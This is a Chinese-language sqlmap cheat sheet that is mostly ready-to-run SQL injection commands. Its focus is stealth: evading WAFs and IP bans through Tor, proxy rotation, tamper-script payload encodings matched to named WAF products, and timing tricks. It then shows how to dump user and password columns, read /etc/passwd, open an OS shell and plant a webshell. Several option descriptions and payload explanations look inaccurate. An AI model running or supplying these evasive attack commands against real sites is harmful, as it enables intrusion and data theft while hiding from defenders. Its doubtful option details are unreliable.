# sqlmap

sqlmap 是一款自动化 SQL 注入检测与利用工具，支持多种数据库和注入技术。

## 基本语法

```bash
sqlmap -u "目标URL" [选项]
```

### 选项顺序说明

**sqlmap 所有选项之间没有强制先后顺序。** 以下两条命令完全等价：

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --random-agent
sqlmap --random-agent --batch --dbs -u "http://target.com/page.php?id=1"
```

约定上 `-u`（或 `-r`）放最前面，是为了可读性，不是语法要求。

**少数需要注意的情况：**

| 场景 | 说明 |
|------|------|
| `-u` vs `-r` | 同时给出时 `-r` 优先级更高（直接使用请求文件） |
| `--resume` | 不需要 `-u`，会话文件已包含目标 URL |
| `--tamper` 内部顺序 | tamper 脚本按你写的顺序**从左到右依次执行**，顺序不同可能产生不同的 payload。例如 `--tamper=space2comment,charencode` 先替换空格为注释，再 URL 编码；反过来编码后的 `/**/` 可能被二次编码 |
| `--technique` 内部 | 字母顺序无所谓，`BT` 和 `TB` 等价 |
| `--prefix` / `--suffix` | 与 `--tamper` 的执行顺序：先应用 prefix/suffix 包裹原始 payload，再交给 tamper 脚本处理 |

## 常用选项速查

### 目标设置

| 选项               | 说明                        |
| ---------------- | ------------------------- |
| `-u URL`         | 目标 URL                    |
| `-m FILE`        | 从文件读取多个目标 URL             |
| `-r REQUESTFILE` | 从 HTTP 请求文件加载请求           |
| `-l LOGFILE`     | 从 Burp/WebScarab 日志文件解析目标 |

### 请求配置

| 选项 | 说明 |
|------|------|
| `--data=DATA` | 通过 POST 发送数据 |
| `--cookie=COOKIE` | 设置 Cookie |
| `--user-agent=UA` | 自定义 User-Agent |
| `--random-agent` | 随机 User-Agent |
| `-H` / `--headers=HEADER` | 添加请求头（可多次使用，`--headers` 支持换行分隔多个） |
| `--method=METHOD` | HTTP 方法（GET/POST） |
| `--proxy=PROXY` | 使用代理（如 `http://127.0.0.1:8080`） |
| `--proxy-file=FILE` | 从文件读取代理列表，轮询使用 |
| `--tor` | 通过 Tor 网络发送请求 |
| `--tor-port=PORT` | Tor 端口（默认 9050） |
| `--tor-type=TYPE` | Tor 类型：SOCKS4/SOCKS5/HTTP |
| `--check-tor` | 检查 Tor 是否可用 |
| `--delay=SEC` | 每个请求间隔（秒） |
| `--timeout=SEC` | 请求超时时间 |
| `--retries=N` | 失败重试次数 |
| `--threads=N` | 并发线程数（默认 1，最大 10） |

### 注入检测

| 选项 | 说明 |
|------|------|
| `-p PARAMETER` | 指定测试参数 |
| `--level=N` | 测试等级（1-5，默认 1） |
| `--risk=N` | 风险等级（1-3，默认 1） |
| `--technique=TECH` | 注入技术：B/E/U/S/T/Q（布尔/报错/联合/堆叠/时间/内联） |
| `--dbms=DBMS` | 指定数据库类型（如 mysql, mssql, oracle） |
| `--os=OS` | 指定操作系统（Windows/Linux） |
| `--batch` | 非交互模式，全部默认选择 |
| `--tamper=TAMPER` | 使用绕过脚本（逗号分隔多个） |
| `--prefix=PREFIX` | 自定义注入 payload 前缀（如 `'))`） |
| `--suffix=SUFFIX` | 自定义注入 payload 后缀（如 `-- -`） |
| `--check-waf` | 检测目标是否有 WAF/IPS/IDS |
| `--skip-waf` | 跳过 WAF 检测，直接测试 |
| `--identify-waf` | 识别 WAF 类型并针对性绕过 |

### 信息获取

| 选项 | 说明 |
|------|------|
| `--dbs` | 枚举数据库 |
| `--tables` | 枚举表 |
| `--columns` | 枚举列 |
| `-D DBNAME` | 指定数据库 |
| `-T TABLENAME` | 指定表 |
| `-C COLUMNS` | 指定列（逗号分隔） |
| `--dump` | 导出数据 |
| `--start=N` | 从第 N 条开始导出 |
| `--stop=N` | 到第 N 条结束导出 |
| `--sql-query=QUERY` | 执行自定义 SQL 语句 |
| `--current-user` | 获取当前用户 |
| `--current-db` | 获取当前数据库 |
| `--is-dba` | 判断是否为 DBA |
| `--users` | 枚举数据库用户 |
| `--passwords` | 枚举用户密码哈希 |
| `--privileges` | 枚举用户权限 |

### 系统访问

| 选项                  | 说明         |
| ------------------- | ---------- |
| `--os-shell`        | 获取系统 shell |
| `--os-cmd=CMD`      | 执行系统命令     |
| `--file-read=FILE`  | 读取服务器文件    |
| `--file-write=FILE` | 写入文件到服务器   |
| `--file-dest=FILE`  | 写入目标路径     |

### 会话与输出

| 选项 | 说明 |
|------|------|
| `-v VERBOSE` | 详细级别（0-6，默认 1） |
| `--output-dir=DIR` | 输出目录 |
| `--csv-del=CHAR` | CSV 分隔符 |
| `--save=FILE` | 保存扫描状态到文件 |
| `--resume=FILE` | 从保存的会话恢复扫描 |
| `--flush-session` | 刷新当前目标的会话文件 |
| `--fresh-queries` | 忽略已缓存的查询结果 |

### 规避与隐身

| 选项 | 说明 |
|------|------|
| `--delay=SEC` | 每个 HTTP 请求之间的固定延迟（秒） |
| `--time-sec=SEC` | 时间盲注的响应等待时间（秒） |
| `--safe-url=URL` | 定期访问的"安全"URL，模拟正常行为 |
| `--safe-freq=N` | 每 N 个测试请求后访问一次 safe-url |
| `--safe-post=DATA` | safe-url 的 POST 数据 |
| `--skip-urlencode` | 不对 payload 做 URL 编码 |
| `--chunked` | 使用分块传输编码 |
| `--hpp` | 使用 HTTP 参数污染 |
| `--force-ssl` | 强制使用 SSL/TLS |
| `--host=HOST` | 自定义 Host 头 |
| `--referer=REFERER` | 自定义 Referer 头 |
| `--headers=HEADERS` | 同 `-H`，但支持换行分隔多个请求头 |
| `--eval=CODE` | 每次请求前执行 Python 代码（用于动态参数） |
| `--csrf-token=PARAM` | CSRF token 参数名 |
| `--csrf-url=URL` | 提取 CSRF token 的页面 URL |
| `--csrf-method=METHOD` | 提取 CSRF token 的 HTTP 方法 |

---

## 规避防火墙与 IP 封禁

这是使用 sqlmap 进行高强度扫描时最需要关注的方面。目标防火墙/WAF 通常通过以下方式封禁 IP：

- 短时间内大量请求（速率限制）
- 请求中包含明显的 SQL 注入 payload 特征
- User-Agent 异常或缺失
- 请求参数格式异常

以下策略从多个维度降低被封禁的风险。

### 1. WAF/防火墙检测与识别

在开始注入之前，先探测目标部署了什么防护：

```bash
# 检测是否存在 WAF
sqlmap -u "http://target.com/page.php?id=1" --check-waf

# 识别具体 WAF 类型
sqlmap -u "http://target.com/page.php?id=1" --identify-waf
```

常见 WAF 及其特征：

| WAF 产品 | 典型环境 | 关键特征 |
|----------|----------|----------|
| Cloudflare | CDN/WAF | `__cfduid` Cookie, `cf-ray` 头 |
| ModSecurity | Apache/Nginx 模块 | 常见于共享主机和 cPanel |
| Imperva/Incapsula | 企业 WAF | `incap_ses_`, `visid_incap_` Cookie |
| AWS WAF | AWS 环境 | 配合 CloudFront/ALB 使用 |
| FortiWeb | Fortinet | 企业级硬件 WAF |
| F5 BIG-IP ASM | F5 负载均衡 | `TS` + 随机字符串 Cookie |
| 安全狗 | 国内主机 | 返回页面包含"安全狗"特征 |
| 云锁 | 国内主机 | 返回页面包含 JS challenge |

### 2. 代理与 IP 轮换

**通过 Burp Suite / 本地代理调试：**

```bash
# 所有请求经过 Burp，便于观察和分析
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

**使用 Tor 网络匿名：**

```bash
# 先启动 Tor 服务，然后：
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor

# 配合随机 User-Agent
sqlmap -u "http://target.com/page.php?id=1" \
  --tor --tor-type=SOCKS5 \
  --random-agent \
  --delay=2
```

> Tor 出口节点每 10 分钟左右更换一次 IP，在长扫描中提供一定程度的 IP 轮换。但出口节点 IP 有限，仍可能被目标识别为 Tor 流量。

**使用代理池轮换：**

```bash
# 准备代理列表文件 proxies.txt，每行一个代理
# socks5://127.0.0.1:9050
# http://user:pass@proxy1.example.com:8080
# http://proxy2.example.com:3128

sqlmap -u "http://target.com/page.php?id=1" \
  --proxy-file=proxies.txt \
  --delay=1 \
  --random-agent
```

**通过 proxychains 间接使用：**

```bash
# 配置 /etc/proxychains.conf 添加多组代理
# 然后在 sqlmap 外层套 proxychains
proxychains sqlmap -u "http://target.com/page.php?id=1" \
  --delay=2 --random-agent --batch
```

### 3. 速率控制 —— 最核心的反封禁手段

```bash
# 固定延迟：每个请求间隔 2 秒
sqlmap -u "http://target.com/page.php?id=1" --delay=2

# 更长的延迟（适合敏感目标），间隔 5 秒
sqlmap -u "http://target.com/page.php?id=1" --delay=5

# 控制并发线程数，默认为 1（最安全）
sqlmap -u "http://target.com/page.php?id=1" --threads=1
```

**延迟建议：**

| 目标类型 | 建议 delay | 建议 threads |
|----------|-----------|--------------|
| 本地/测试环境 | 0 | 3-5 |
| 远程目标（无 WAF） | 0.5 - 1 | 1 |
| 远程目标（有 WAF） | 2 - 3 | 1 |
| 高度敏感目标 | 5 - 10 | 1 |
| 通过 Tor | 2 - 3 | 1 |

> `--delay` 是固定的，没有随机抖动。如果目标有智能速率检测，固定间隔可能仍然触发告警。此时可以考虑用 `--eval` 引入随机延迟（见高级技巧）。

### 4. 模拟正常用户行为

```bash
# 关键组合：随机UA + 安全URL混入 + 延迟
sqlmap -u "http://target.com/page.php?id=1" \
  --random-agent \
  --delay=2 \
  --safe-url="http://target.com/index.html" \
  --safe-freq=10
```

- `--safe-url`：每 N 个测试请求后，sqlmap 会访问一个"正常"的 URL，模拟普通用户浏览行为
- `--safe-freq`：控制混入频率（建议 10-20）

**完整的隐身扫描模板：**

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --random-agent \
  --delay=2 \
  --safe-url="http://target.com/index.html" \
  --safe-freq=15 \
  --threads=1 \
  --time-sec=3 \
  --level=2 \
  --risk=1
```

### 5. 针对性 WAF 绕过 —— Tamper 脚本组合

只靠速率控制不够，payload 也要绕过得去。

**按 WAF 类型推荐的 Tamper 组合：**

```bash
# Cloudflare (中等强度)
sqlmap -u "..." --tamper=space2comment,randomcase,between,charencode

# ModSecurity (Apache/Nginx 模块)
sqlmap -u "..." --tamper=space2comment,randomcase,versionedmore,modsecurityversioned

# Imperva / Incapsula
sqlmap -u "..." --tamper=space2comment,randomcase,between,charencode,charunicodeencode

# 安全狗 (国内常见)
sqlmap -u "..." --tamper=space2comment,randomcase,apostrophemask,charencode

# 云锁 (国内常见)
sqlmap -u "..." --tamper=space2comment,randomcase,versionedmore,charencode

# 通用/未知 WAF —— 多层绕过
sqlmap -u "..." \
  --tamper=space2comment,randomcase,between,charencode,versionedmore,greatest,equaltolike \
  --level=3 --risk=2
```

**Tamper 脚本全量分类：**

### 一、通用型（多数据库适用）

| 编号 | 脚本名称 | 作用 | 实现方式示例 |
|------|----------|------|-------------|
| 1 | `apostrophemask.py` | 用 UTF-8 编码代替引号 | `1 AND %EF%BC%871%EF%BC%87=%EF%BC%871` |
| 2 | `base64encode.py` | 用 Base64 编码替换 | `MScgQU5EIFNMRUVQKDUplw==` |
| 3 | `multiplespaces.py` | 在 SQL 关键字周围添加多个空格 | `1  UNION  SELECT  foobar` |
| 4 | `space2plus.py` | 空格替换为 `+` | `SELECT+id+FROM+users` |
| 5 | `nonrecursivereplacement.py` | 双重查询语句，取代预定义 SQL 关键字 | `1 UNIOUNIONN SELESELECTCT 2--` |
| 6 | `space2randomblank.py` | 空格替换为随机空白字符 | `SELECT%0Did%0DFROM%0Ausers` |
| 7 | `unionalltounion.py` | 将 UNION ALL SELECT 替换为 UNION SELECT | `-4 UNION SELECT` |
| 8 | `securesphere.py` | 追加特制字符串 | `1 AND 1=1 and '0having='0having` |
| 9 | `space2hash.py` | 空格替换为 # + 随机字符串 + 换行 | `1--nVNaVoPYeva%0AAND--IngNvzqu%0A9227=9227` |
| 10 | `equaltolike.py` | 用 LIKE 代替等号 `=` | `SELECT * FROM users WHERE id LIKE 1` |
| 11 | `between.py` | 用 BETWEEN 代替大于号 `>` | `1 AND A NOT BETWEEN 0 AND B--` |
| 12 | `greatest.py` | 用 GREATEST 绕过对 `>` 的过滤 | `1 AND GREATEST(A,B+1)=A` |
| 13 | `apostrophenullencode.py` | 绕过双引号过滤，替换字符和双引号 | `1 AND %00%271%00%27=%00%271` |
| 14 | `ifnull2ifisnull.py` | 绕过 IFNULL 过滤，替换为 `IF(ISNULL())` | `IF(ISNULL(1),2,1)` |
| 15 | `randomcase.py` | SQL 关键字随机大小写 | `InsERt` |
| 16 | `charencode.py` | URL 编码 | `%53%45%4C%45%43%54...` |
| 17 | `charunicodeencode.py` | 字符串 Unicode 编码 | `%u0053%u0045%u004C%u0045%u0043%u0054...` |
| 18 | `space2comment.py` | 空格替换为注释 `/**/` | `SELECT/**/id/**/FROM/**/users` |
| 19 | `chardoubleencode.py` | 双重 URL 编码（不处理已编码的） | `%2553%2545%254C%2545%2543%2554...` |
| 20 | `unmagicquotes.py` | 宽字符绕过 GPC addslashes | `1%bf%27 AND 1=1--%20` |
| 21 | `randomcomments.py` | 用 `/**/` 分割 SQL 关键字 | `IN/**/SERT` |
| 22 | `htmlencode.py` | HTML 实体编码 payload | `&#49;&#32;&#65;&#78;&#68;&#32;&#49;...` |

### 二、MySQL 专用

| 编号 | 脚本名称 | 作用 | 实现方式示例 |
|------|----------|------|-------------|
| 1 | `space2mssqlblank.py` | 空格替换为其它空白符（也支持 MSSQL） | `SELECT%08id%02FROM%0Fusers` |
| 2 | `space2mssqlhash.py` | 空格替换为 `#%0A` | `1%23%0AAND%23%0A9227=9227` |
| 3 | `percentage.py` | 每个字符前添加 `%` 号（ASP） | `%S%E%L%E%C%T %F%I%E%L%D...` |
| 4 | `modsecurityversioned.py` | 包含完整查询的版本注释 | `1/*!30874AND 2>1*/--` |
| 5 | `space2mysqlblank.py` | 空格替换为 MySQL 空白符 | `SELECT%0Bid%0BFROM%0Ausers` |
| 6 | `modsecurityzeroversioned.py` | 包含完整查询与零版本注释 | `1/*!00000AND 2>1*/--` |
| 7 | `space2mysqldash.py` | 空格替换为 `--%0A` 注释 + 随机字符串 | `1--%0AAND--%0A9227=9227` |
| 8 | `bluecoat.py` | 空格替换后添加随机空白字符 | `SELECT%09id FROM users where id LIKE 1` |
| 9 | `versionedkeywords.py` | 用版本化 MySQL 注释包裹每个关键字 | `1/*!UNION*//*!ALL*//*!SELECT*/...` |
| 10 | `versionedmorekeywords.py` | 每个关键字前添加版本化注释 | `1/*!UNION*//*!ALL*//*!SELECT*/...` |
| 11 | `space2morehash.py` | 用 `#` 以及更多随机字符串替换空格 | `1%23PTTmJopxdWJ%0AAND%23cWfeVRPV%0A9227=9227` |
| 12 | `versionedmore.py` | 条件后追加版本注释 `/*!xxxxx*/` | `AND 1=1` -> `AND 1=1 /*!12345*/` |
| 13 | `commalesslimit.py` | `LIMIT 1,2` 替换为 `LIMIT 1 OFFSET 2` | 绕过逗号过滤 |
| 14 | `commalessmid.py` | `MID(A,B,C)` 替换为 `MID(A FROM B FOR C)` | 绕过逗号过滤 |
| 15 | `halfversionedmore.py` | 版本注释前加空格 | `AND 1=1` -> `AND 1=1 /*! 12345*/` |

### 三、MSSQL（SQL Server）专用

| 编号 | 脚本名称 | 作用 | 实现方式示例 |
|------|----------|------|-------------|
| 1 | `space2mssqlblank.py` | 空格替换为其它空白符 | `SELECT%08id%02FROM%0Fusers` |
| 2 | `space2mssqlhash.py` | 空格替换为 `#%0A` | `1%23%0AAND%23%0A9227=9227` |
| 3 | `percentage.py` | 每个字符前添加 `%` 号 | `%S%E%L%E%C%T %F%I%E%L%D...` |
| 4 | `sp_password.py` | 在载荷末尾追加 `sp_password` | `1 AND 9227=9227-- sp_password'` |

### 四、Oracle 专用

| 编号 | 脚本名称 | 作用 |
|------|----------|------|
| 1 | `between.py` | 用 BETWEEN 代替大于号 `>` |
| 2 | `greatest.py` | 用 GREATEST 绕过对 `>` 的过滤 |
| 3 | `apostrophenullencode.py` | 绕过双引号过滤 |
| 4 | `charencode.py` | URL 编码 |
| 5 | `randomcase.py` | 随机大小写 |
| 6 | `charunicodeencode.py` | Unicode 编码 |
| 7 | `space2comment.py` | 空格替换为注释 `/**/` |

### 五、PostgreSQL 专用

| 编号 | 脚本名称 | 作用 |
|------|----------|------|
| 1 | `percentage.py` | 每个字符前添加 `%` 号 |
| 2 | `charencode.py` | URL 编码 |
| 3 | `randomcase.py` | 随机大小写 |
| 4 | `charunicodeencode.py` | Unicode 编码 |
| 5 | `space2comment.py` | 空格替换为注释 `/**/` |

### 六、Access 专用

| 编号 | 脚本名称 | 作用 | 实现方式示例 |
|------|----------|------|-------------|
| 1 | `appendnullbyte.py` | 在载荷末尾添加零字节字符 | `1 AND 1=1%00'` |

### 七、其他 / 特殊用途

| 编号 | 脚本名称 | 作用 |
|------|----------|------|
| 1 | `chardoubleencode.py` | 双重 URL 编码 |
| 2 | `xforwardedfor.py` | 伪造 X-Forwarded-For 头，绕过来源 IP 检测 |

### 使用方式

```bash
# 单个 tamper
sqlmap -u "http://target.com?id=1" --tamper=space2comment.py

# 多个 tamper 组合使用（用逗号分隔，从左到右依次执行）
sqlmap -u "http://target.com?id=1" --tamper=space2comment.py,randomcase.py,charencode.py
```

> **注意：** `versionedmorekeywords.py` 在不同版本中实现略有差异，一个是纯注释方式，另一个结合了 `/*!*/` 版本注释，此处已合并整理。

### 6. 减少测试参数范围

默认 sqlmap 会测试所有发现的参数，减少测试面可以降低请求量和特征暴露：

```bash
# 只测试指定参数
sqlmap -u "http://target.com/page.php?id=1&page=2" -p id

# 只测试布尔盲注和时间盲注（跳过最"吵"的 UNION 注入）
sqlmap -u "http://target.com/page.php?id=1" --technique=BT

# 指定数据库类型，减少探测指纹数量
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
```

### 7. level 与 risk 对战损比的影响

不同 level 发送的请求量差异巨大：

| level | 测试参数范围 | 请求量估算 | 被封风险 |
|-------|-------------|-----------|---------|
| 1 | GET/POST 参数 | ~100 请求 | 低 |
| 2 | + Cookie | ~200 请求 | 低-中 |
| 3 | + User-Agent, Referer | ~400 请求 | 中 |
| 4 | + 更深入的 Header 测试 | ~800 请求 | 中-高 |
| 5 | + Host, 所有可见参数 + 组合 | ~1500+ 请求 | 高 |

```bash
# 大规模扫描时尽量保持低 level
# 先快速探测，有苗头再深入
sqlmap -u "http://target.com/page.php?id=1" --level=1 --risk=1 --batch

# 如果 --level=1 没结果但有理由怀疑注入存在，再提升
sqlmap -u "http://target.com/page.php?id=1" --level=2 --risk=2 \
  --technique=BT --delay=2 --random-agent
```

### 8. 高级规避技巧

**动态参数（--eval）：**

```bash
# 每次请求前用 Python 代码动态计算参数值
# 例如：每次请求使用不同的 ID 偏移
sqlmap -u "http://target.com/page.php" --eval="import random; id=str(random.randint(1,1000))" --data="id=1"

# 引入随机延迟抖动（绕过固定间隔检测）
sqlmap -u "http://target.com/page.php?id=1" \
  --eval="import time,random; time.sleep(random.uniform(0.5, 2.5))"
```

**HTTP 参数污染（--hpp）：**

```bash
# 对参数做污染，不同中间件解析方式不同，可能绕过 WAF
# 例如：id=1&id=2，WAF 检查第一个，后端取第二个
sqlmap -u "http://target.com/page.php?id=1" --hpp
```

**分块传输编码（--chunked）：**

```bash
# 将 POST body 分块发送，绕过按完整请求检测的 WAF
sqlmap -u "http://target.com/page.php" --data="id=1" --chunked
```

**CSRF Token 处理：**

```bash
# 目标有 CSRF 保护时，让 sqlmap 自动获取和使用 token
sqlmap -u "http://target.com/login.php" \
  --data="user=admin&pass=123&csrf_token=xxx" \
  --csrf-token=csrf_token \
  --csrf-url="http://target.com/login.php"
```

---

## 会话持久化与断点续扫

长时间扫描被中断（IP 被封、网络断开、手动停止）时，不必从头开始：

```bash
# 第一次扫描时保存进度
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --save=scan_progress.session

# 中断后，从保存的会话恢复
sqlmap --resume=scan_progress.session

# 扫描过程中 sqlmap 自动在 output 目录保存进度
# 用目标 URL 的哈希值命名，可以直接恢复
sqlmap --resume=~/.local/share/sqlmap/output/target.com/session.sqlite
```

**注意：** 恢复扫描时，已完成的检测结果来自缓存（`.sqlite` 文件），不会重复发送请求。如果需要重新测试某个参数，先用 `--flush-session` 清除缓存。

---

## 常用示例

### 1. 基础检测

```bash
# 检测 GET 参数是否存在注入
sqlmap -u "http://target.com/page.php?id=1"

# 检测 POST 参数
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123" -p user

# 批量扫描
sqlmap -m targets.txt --batch
```

### 2. 使用请求文件

```bash
# 从 Burp 保存的请求文件加载（可以保留 Cookie、Header 等完整上下文）
sqlmap -r request.txt

# 指定参数并提高检测强度
sqlmap -r request.txt -p id --level=3 --risk=2
```

### 3. 获取数据

```bash
# 枚举数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 枚举指定数据库的所有表
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 枚举指定表的所有列
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# 导出数据
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

### 4. 完整隐身扫描示例

```bash
# 场景：目标有 Cloudflare WAF，高风险被禁 IP
sqlmap -u "http://target.com/page.php?id=1" \
  --tor --tor-type=SOCKS5 \
  --random-agent \
  --delay=2 \
  --safe-url="http://target.com/" \
  --safe-freq=10 \
  --threads=1 \
  --level=2 \
  --risk=1 \
  --technique=BT \
  --tamper=space2comment,randomcase,between,charencode \
  --dbms=mysql \
  --batch \
  --save=target_scan.session
```

### 5. 系统操作

```bash
# 执行系统命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd=whoami

# 获取交互式 shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 读取服务器文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# 上传文件（写 Webshell）
sqlmap -u "http://target.com/page.php?id=1" \
  --file-write=shell.php --file-dest=/var/www/html/shell.php
```

---

## 实战场景

### 场景 1：Cloudflare 防护下的 MySQL 注入

```bash
# 第一步：确认 WAF 类型和注入点（低强度探测）
sqlmap -u "http://target.com/product.php?id=1" \
  --check-waf \
  --level=1 --risk=1 \
  --delay=2 --random-agent \
  --technique=B

# 第二步：确认可注入后，针对性提取数据
sqlmap -u "http://target.com/product.php?id=1" \
  --dbms=mysql \
  --tamper=space2comment,randomcase,between,charencode \
  --delay=3 --random-agent --tor \
  --safe-url="http://target.com/" --safe-freq=10 \
  --technique=BT \
  --dbs
```

### 场景 2：后端是 MSSQL，目标有 ModSecurity

```bash
# MSSQL 的注入技术偏好和 MySQL 不同
sqlmap -u "http://target.com/product.php?id=1" \
  --dbms=mssql \
  --tamper=space2comment,between,randomcase,modsecurityversioned \
  --delay=2 --random-agent \
  --technique=BEUS \
  --level=2 --risk=2
```

### 场景 3：POST JSON 注入点

```bash
# 从 Burp 保存 JSON 请求，用 * 标记注入位置
# 请求文件内容：
# POST /api/user HTTP/1.1
# Content-Type: application/json
# ...
# {"username":"admin*"}

sqlmap -r request.txt --tamper=space2comment,charencode
```

### 场景 4：需要登录认证的目标

```bash
# 方式一：直接传入 Cookie
sqlmap -u "http://target.com/profile.php?id=1" \
  --cookie="PHPSESSID=abc123; token=xyz789"

# 方式二：使用请求文件（保留完整认证上下文）
# 在 Burp 中登录后，保存一个带完整 Cookie 和 Header 的请求
sqlmap -r authenticated_request.txt
```

### 场景 5：Cookie 值本身就是注入点

```bash
# Cookie 中的参数需要 --level >= 2 才会被测试
sqlmap -u "http://target.com/index.php" \
  --cookie="tracking_id=1" \
  --level=2 \
  --technique=B
```

### 场景 6：PostgreSQL Cookie 布尔盲注（请求文件 + 自定义前后缀）

```bash
sqlmap -r target.txt \
  -p "TrackingId" \
  --cookie="TrackingId=QlwkDggWZ9kB8CzU" \
  --proxy="http://172.21.191.113:7890" \
  --batch \
  --level=3 \
  --risk=2 \
  --threads=3 \
  --delay=1 \
  --prefix="'" \
  --suffix=" AND '1'='1" \
  --technique=B \
  --dbms=PostgreSQL \
  --no-urlencode \
  --flush-session
```

**逐项解释：**

| 选项 | 值 | 说明 |
|------|-----|------|
| `-r` | `target.txt` | 从文件加载原始 HTTP 请求（通常是 Burp Suite 保存的），保留完整的请求头、Cookie、POST body 等上下文 |
| `-p` | `TrackingId` | 只测试 `TrackingId` 这一个参数，跳过其他参数，减少无用请求和特征暴露 |
| `--cookie` | `TrackingId=QlwkDggWZ9kB8CzU` | 设置/覆盖 Cookie 值。这里为 `TrackingId` 提供一个合法的初始值，sqlmap 会在此基础上替换为注入 payload |
| `--proxy` | `http://172.21.191.113:7890` | 所有请求通过指定代理发送，便于用 Burp 或其他工具观察实际发出的请求，方便调试 |
| `--batch` | — | 非交互模式，所有选项使用默认值，不会中途停下来询问用户 |
| `--level` | `3` | 测试等级 3。除 GET/POST 参数外，还会测试 Cookie、User-Agent、Referer 等 HTTP 头中的参数。Cookie 注入至少需要 `--level=2`，这里设 3 覆盖更全面 |
| `--risk` | `2` | 风险等级 2。允许使用 `OR` 条件等中等风险的测试向量（level 3 + risk 2 是 Cookie 盲注的常见组合） |
| `--threads` | `3` | 3 个并发线程。布尔盲注需要大量请求逐个推断字符，适当提高线程数可加快速度。注意：线程数过高可能触发速率限制 |
| `--delay` | `1` | 每个 HTTP 请求间隔 1 秒。配合 3 线程时，实际每秒约发出 3 个请求，在速度和隐蔽性之间取平衡 |
| `--prefix` | `'` | 在注入 payload **前面**插入一个单引号，用于闭合 SQL 语句中前面的引号。例如原始 SQL 是 `SELECT * FROM sessions WHERE id='<payload>'`，加入前缀后变为 `'<payload>'`，引号被闭合 |
| `--suffix` | ` AND '1'='1` | 在注入 payload **后面**追加字符串，用于闭合 payload 后面的引号并让整个 SQL 语句语法正确。` AND '1'='1` 是一个恒真条件，加上前缀 `'` 后，完整注入形如：`' AND 1=1-- AND '1'='1`，既闭合了前面的引号，又确保了后面的引号也被正确闭合 |
| `--technique` | `B` | 只使用**布尔盲注**（Boolean-based blind）。在无法直接看到查询结果时，通过页面响应差异（TRUE/FALSE）逐位推断数据。请求量较大但隐蔽性最高 |
| `--dbms` | `PostgreSQL` | 强制指定后端数据库为 PostgreSQL。跳过数据库指纹探测阶段，减少探测请求量，同时确保 payload 语法适配 PostgreSQL（如 `CAST`、`SUBSTR` 等函数） |
| `--no-urlencode` | — | 不对 payload 做 URL 编码。当 Cookie 值中的特殊字符（如单引号）不需要编码即可被后端解析时使用。注意：这取决于目标应用对 Cookie 的解析方式 |
| `--flush-session` | — | 清空当前目标的会话缓存，强制 sqlmap 从头开始测试。之前的扫描结果（如已确认的注入点、已缓存的数据）会被丢弃，适合重新探测或更换注入策略时使用 |

**执行流程解析：**

1. sqlmap 读取 `target.txt` 中的原始 HTTP 请求，解析出目标 URL、请求头、Cookie 等
2. 通过 `--cookie` 设置 `TrackingId` 的初始值，`-p` 指定只攻击这个参数
3. `--flush-session` 确保不加载旧缓存，全新开始
4. 所有请求通过代理 `172.21.191.113:7890` 发出，便于在 Burp 中实时观察
5. 对 `TrackingId` 参数注入时，sqlmap 先拼接 prefix/suffix：`'<payload> AND '1'='1`
6. 注入后完整的 TrackingId 值类似：`QlwkDggWZ9kB8CzU' AND 1=1-- AND '1'='1`
7. 后端 SQL 执行时变为：`SELECT ... WHERE tracking_id='QlwkDggWZ9kB8CzU' AND 1=1-- AND '1'='1'`
   - `'` 闭合了原始值后面的引号
   - `AND 1=1--` 是注入的测试条件（TRUE 时页面正常，FALSE 时页面异常）
   - `--` 注释掉后面的内容
   - 后缀 ` AND '1'='1` 确保即便 `--` 注释未生效，剩余 SQL 语法仍然正确
8. 通过比较 TRUE/FALSE 页面的响应差异，逐个字符推断数据库内容

**适用场景：**
- 目标使用 PostgreSQL 数据库
- Cookie 中的 `TrackingId` 参数存在注入，且需要闭合引号
- 注入点无回显（无 UNION 注入可能），只能用布尔盲注推断数据
- 需要通过代理观察请求以验证 payload 和前后缀是否正确

---

## 实用技巧

### level 与 risk 的选择

| 场景 | 建议 |
|------|------|
| 快速测试 | `--level=1 --risk=1` |
| 标准测试 | `--level=2 --risk=1` |
| 全面测试（可能触发 WAF） | `--level=3 --risk=2` |
| 深度测试（可能损坏数据） | `--level=5 --risk=3` |

### Cookie 注入

```bash
sqlmap -u "http://target.com/page.php" --cookie="id=1" --level=2
```

> 需要 `--level=2` 或更高，sqlmap 才会测试 Cookie 参数。

### User-Agent / Referer 注入

```bash
sqlmap -u "http://target.com/page.php" \
  -H "User-Agent: 1" \
  -H "Referer: 1" \
  --level=3
```

> 需要 `--level=3` 才会测试 User-Agent 和 Referer 头。

### 从文件读取 SQL 语句执行

```bash
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

### 获取交互式 SQL Shell

```bash
# 不用每次都 --sql-query，直接进交互式 SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

---

## 注意事项

1. **授权测试**：仅在获得明确授权的系统上使用
2. **数据安全**：`--dump` 会下载数据到本地，注意保护
3. **风险控制**：`--risk=3` 可能使用 `OR` 条件导致数据库更新，谨慎使用。`--risk=3` 在 MySQL 中可能触发 `OR 1=1` 全表更新
4. **速率控制**：务必设置 `--delay` 避免拖垮目标服务器。生产环境至少 `--delay=1`
5. **日志暴露**：使用 `--proxy` 通过 Burp Suite 观察请求以便调试
6. **IP 封禁**：高 level + 无延迟 = 几乎必然被封。遇到封禁时：
   - 降低 `--level` 和 `--risk`
   - 只用时间盲注 `--technique=T`（请求量最小）
   - 换代理 IP 后用 `--resume` 继续
   - 增大 `--delay` 到 5-10 秒
7. **时间盲注不稳定**：网络波动可能造成误判。如果目标网络不稳定，优先使用布尔盲注 `--technique=B`
8. **SSL 证书**：内网自签名证书目标需加 `--force-ssl` 或设置 `--proxy` 通过 Burp 处理
9. **二次注入**：sqlmap 默认不支持二次注入（存储型注入），这类场景需要手动构造请求文件
